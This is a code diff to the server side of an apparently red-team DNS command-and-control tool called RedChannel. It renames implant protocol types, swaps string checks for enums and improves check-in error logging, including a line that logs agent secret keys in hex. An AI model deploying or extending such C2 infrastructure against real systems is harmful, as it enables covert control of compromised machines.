@@ -397,12 +397,12 @@ export default class RedChannel {
         if (!agent) throw new Error(`agent ${agentId} not found`);
         if (!agent.secret) throw new Error(`missing agent ${agentId} secret, do you need to 'keyx'?`);
 
-        const commandProto = implant.Command_Request.create({
+        const commandProto = implant.CommandRequest.create({
             command: command,
             data: data,
         });
 
-        let commandProtoBuffer = Buffer.from(implant.Command_Request.toBinary(commandProto));
+        let commandProtoBuffer = Buffer.from(implant.CommandRequest.toBinary(commandProto));
 
         // keyx commands are not encrypted
         if (command !== implant.AgentCommand.KEYX) {
@@ -498,7 +498,7 @@ export default class RedChannel {
         return is;
     }
 
-    makeIpString(status: implant.C2ResponseStatus) {
+    makeIpString(status: implant.C2Response) {
         const lastByte = padZero(status.toString(16), 2);
         return `${Config.IP_HEADER_PREFIX}:0000:${padZero(implant.AgentCommand.IGNORE.toString(16), 2)}01:0000:0000:dead:c0de:00${lastByte}`;
     }
@@ -588,7 +588,7 @@ export default class RedChannel {
 
         const question = res.question[0];
         const hostname = question.name;
-        const channel = question.type === "PROXY" ? AgentChannel.PROXY : AgentChannel.DNS;
+        const channel = question.type === C2AnswerType.TYPE_PROXY ? AgentChannel.PROXY : AgentChannel.DNS;
 
         const staticDnsHostnameIp = this.config.staticDns[hostname];
         if (staticDnsHostnameIp) {
@@ -608,7 +608,7 @@ export default class RedChannel {
         }
         this.log.debug(`query: ${req.connection.remoteAddress}:${req.connection.type} ${question.type} ${question.name}`);
 
-        if (question.type !== "AAAA" && question.type !== "PROXY") {
+        if (question.type !== C2AnswerType.TYPE_AAAA && question.type !== C2AnswerType.TYPE_PROXY) {
             // this.log.debug(`ignoring non-AAAA/non-PROXY query ${req.connection.remoteAddress}:${req.connection.type} ${question.type} ${question.name}`);
             return res.end();
         }
@@ -623,7 +623,7 @@ export default class RedChannel {
             res.answer.push({
                 name: hostname,
                 type: C2AnswerType.TYPE_AAAA,
-                data: this.makeIpString(implant.C2ResponseStatus.ERROR_INVALID_MESSAGE),
+                data: this.makeIpString(implant.C2Response.ERROR_INVALID_MESSAGE),
                 ttl: Config.C2_ANSWER_TTL_SECS,
             });
             return res.end();
@@ -644,7 +644,7 @@ export default class RedChannel {
 
         const dataId = segments.dataId;
         const command = segments.command;
-        const floodId = agentId + segments.antiCacheValue;
+        const floodId = `${agentId}${segments.antiCacheValue}`;
 
         if (this.isAgentFlooding(floodId)) {
             // we have already responded to this agent and antiCacheValue combination
@@ -667,6 +667,7 @@ export default class RedChannel {
 
             // process data, return answer records to send back
             res.answer = res.answer.concat(this.processAgentData(agentId, command, hostname, dataChunks));
+            agent.recvq.delete(dataId);
             return res.end();
         }
 
@@ -674,7 +675,7 @@ export default class RedChannel {
         res.answer.push({
             name: hostname,
             type: C2AnswerType.TYPE_AAAA,
-            data: this.makeIpString(implant.C2ResponseStatus.NEED_MORE_DATA),
+            data: this.makeIpString(implant.C2Response.NEED_MORE_DATA),
             ttl: Config.C2_ANSWER_TTL_SECS,
         });
 
@@ -744,12 +745,17 @@ export default class RedChannel {
                 throw new Error(`invalid agent response proto`);
             }
         } catch (ex) {
-            this.log.error(`cannot decrypt checkin from ${agentId}: ${emsg(ex)}`);
+            // agents check in first time with dummy data (their ID instead of an encrypted payload)
+            if (data === agentId) {
+                this.log.error(`agent ${agentId} is attempting first time checkin, if agent reconnected it may need to be killed first to allow keyx`);
+            } else {
+                this.log.error(`cannot decrypt checkin from ${agentId}: ${emsg(ex)}`);
+            }
             return [
                 {
                     name: hostname,
                     type: C2AnswerType.TYPE_AAAA,
-                    data: this.makeIpString(implant.C2ResponseStatus.ERROR_DECRYPTING_MESSAGE),
+                    data: this.makeIpString(implant.C2Response.ERROR_DECRYPTING_MESSAGE),
                     ttl: Config.C2_ANSWER_TTL_SECS,
                 },
             ];
@@ -764,7 +770,7 @@ export default class RedChannel {
                 {
                     name: hostname,
                     type: C2AnswerType.TYPE_AAAA,
-                    data: this.makeIpString(implant.C2ResponseStatus.NOTHING_TO_DO),
+                    data: this.makeIpString(implant.C2Response.NOTHING_TO_DO),
                     ttl: Config.C2_ANSWER_TTL_SECS,
                 },
             ];
@@ -801,7 +807,7 @@ export default class RedChannel {
                 {
                     name: hostname,
                     type: C2AnswerType.TYPE_AAAA,
-                    data: this.makeIpString(implant.C2ResponseStatus.ERROR_AGENT_UNKNOWN),
+                    data: this.makeIpString(implant.C2Response.ERROR_AGENT_UNKNOWN),
                     ttl: Config.C2_ANSWER_TTL_SECS,
                 },
             ];
@@ -819,7 +825,7 @@ export default class RedChannel {
                         {
                             name: hostname,
                             type: C2AnswerType.TYPE_AAAA,
-                            data: this.makeIpString(implant.C2ResponseStatus.ERROR_CHECKING_IN),
+                            data: this.makeIpString(implant.C2Response.ERROR_CHECKING_IN),
                             ttl: Config.C2_ANSWER_TTL_SECS,
                         },
                     ];
@@ -829,7 +835,7 @@ export default class RedChannel {
                     {
                         name: hostname,
                         type: C2AnswerType.TYPE_AAAA,
-                        data: this.makeIpString(implant.C2ResponseStatus.NOTHING_TO_DO),
+                        data: this.makeIpString(implant.C2Response.NOTHING_TO_DO),
                         ttl: Config.C2_ANSWER_TTL_SECS,
                     },
                 ];
@@ -842,7 +848,7 @@ export default class RedChannel {
                         {
                             name: hostname,
                             type: C2AnswerType.TYPE_AAAA,
-                            data: this.makeIpString(implant.C2ResponseStatus.ERROR_KEYX_NOT_ALLOWED),
+                            data: this.makeIpString(implant.C2Response.ERROR_KEYX_NOT_ALLOWED),
                             ttl: Config.C2_ANSWER_TTL_SECS,
                         },
                     ];
@@ -857,7 +863,7 @@ export default class RedChannel {
                             {
                                 name: hostname,
                                 type: C2AnswerType.TYPE_AAAA,
-                                data: this.makeIpString(implant.C2ResponseStatus.ERROR_GENERATING_KEYS),
+                                data: this.makeIpString(implant.C2Response.ERROR_GENERATING_KEYS),
                                 ttl: Config.C2_ANSWER_TTL_SECS,
                             },
                         ];
@@ -873,7 +879,7 @@ export default class RedChannel {
                         {
                             name: hostname,
                             type: C2AnswerType.TYPE_AAAA,
-                            data: this.makeIpString(implant.C2ResponseStatus.ERROR_IMPORTING_KEY),
+                            data: this.makeIpString(implant.C2Response.ERROR_IMPORTING_KEY),
                             ttl: Config.C2_ANSWER_TTL_SECS,
                         },
                     ];
@@ -888,7 +894,7 @@ export default class RedChannel {
                         {
                             name: hostname,
                             type: C2AnswerType.TYPE_AAAA,
-                            data: this.makeIpString(implant.C2ResponseStatus.ERROR_DERIVING_SECRET),
+                            data: this.makeIpString(implant.C2Response.ERROR_DERIVING_SECRET),
                             ttl: Config.C2_ANSWER_TTL_SECS,
                         },
                     ];
@@ -912,7 +918,7 @@ export default class RedChannel {
                         {
                             name: hostname,
                             type: C2AnswerType.TYPE_AAAA,
-                            data: this.makeIpString(implant.C2ResponseStatus.ERROR_DECRYPTING_MESSAGE),
+                            data: this.makeIpString(implant.C2Response.ERROR_DECRYPTING_MESSAGE),
                             ttl: Config.C2_ANSWER_TTL_SECS,
                         },
                     ];
@@ -935,7 +941,7 @@ export default class RedChannel {
                         {
                             name: hostname,
                             type: C2AnswerType.TYPE_AAAA,
-                            data: this.makeIpString(implant.C2ResponseStatus.ERROR_DECRYPTING_MESSAGE),
+                            data: this.makeIpString(implant.C2Response.ERROR_DECRYPTING_MESSAGE),
                             ttl: Config.C2_ANSWER_TTL_SECS,
                         },
                     ];
@@ -947,7 +953,7 @@ export default class RedChannel {
                         {
                             name: hostname,
                             type: C2AnswerType.TYPE_AAAA,
-                            data: this.makeIpString(implant.C2ResponseStatus.ERROR_INVALID_SYSINFO),
+                            data: this.makeIpString(implant.C2Response.ERROR_INVALID_SYSINFO),
                             ttl: Config.C2_ANSWER_TTL_SECS,
                         },
                     ];
@@ -961,7 +967,7 @@ export default class RedChannel {
             {
                 name: hostname,
                 type: C2AnswerType.TYPE_AAAA,
-                data: this.makeIpString(implant.C2ResponseStatus.DATA_RECEIVED),
+                data: this.makeIpString(implant.C2Response.DATA_RECEIVED),
                 ttl: Config.C2_ANSWER_TTL_SECS,
             },
         ];
@@ -973,7 +979,7 @@ export default class RedChannel {
         return Buffer.concat([cipher.iv, cipher.data]);
     }
 
-    decryptAgentData(agentId: string, data: string): implant.Command_Response | void {
+    decryptAgentData(agentId: string, data: string): implant.CommandResponse {
         const agent = this.agents.get(agentId);
         if (!agent) throw new Error(`agent ${agentId} not found`);
         if (!data) throw new Error("invalid data");
@@ -984,10 +990,17 @@ export default class RedChannel {
         const iv = dataBuffer.subarray(0, this.crypto.BLOCK_LENGTH);
         const ciphertext = dataBuffer.subarray(this.crypto.BLOCK_LENGTH);
 
-        const plaintext = this.crypto.aesDecrypt(ciphertext, agent.secret, iv);
+        let plaintext: Buffer;
+        try {
+            // this.log.info("decrypting: ", ciphertext.toString("hex"), agent.secret.toString("hex"), iv.toString("hex"));
+            plaintext = this.crypto.aesDecrypt(ciphertext, agent.secret, iv);
+        } catch (ex) {
+            this.log.info("aes decrypt failed on: ", ciphertext.toString("hex"), agent.secret.toString("hex"), iv.toString("hex"));
+            throw ex;
+        }
 
         try {
-            const commandProto = implant.Command_Response.fromBinary(plaintext);
+            const commandProto = implant.CommandResponse.fromBinary(plaintext);
             return commandProto;
         } catch (ex) {
             throw new Error(`failed to decode proto: ${emsg(ex)}`);
